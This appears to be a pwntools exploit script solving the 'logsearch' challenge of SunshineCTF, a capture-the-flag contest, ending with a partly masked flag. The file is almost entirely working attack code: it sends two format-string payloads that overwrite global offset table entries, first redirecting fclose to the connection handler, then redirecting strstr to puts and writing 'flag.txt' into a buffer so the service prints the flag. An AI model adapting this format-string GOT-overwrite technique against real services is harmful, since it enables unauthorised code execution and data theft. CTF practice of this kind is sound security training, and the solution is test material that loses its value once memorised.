from pwn import *
import time
import sys

def logsearch(DEBUG):
	if DEBUG=="1":
		r = process("./logsearch")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = 'chal1.sunshinectf.org'
		PORT = 20008
		r = remote(HOST,PORT)
	
	
	r.recvuntil("Enter a search phrase: ")
	puts_plt = 0x08048640
	fclose_got = 0x8049D44
	strstr_got = 0x8049D38
	search_file = 0x08049D7C
	handle_connection = 0x080488F4
	offset = 87
	payload = fmtstr_payload(offset, {fclose_got : handle_connection}, write_size="short")
	r.sendline(payload)
	raw_input("?")
	payload = fmtstr_payload(offset, {strstr_got: puts_plt, search_file: 0x67616c66, search_file+4: 0x7478742e}, write_size="short")
	r.sendline(payload)
	r.interactive()

logsearch(sys.argv[1])
"""
sun{**_********_**_hunter2}
"""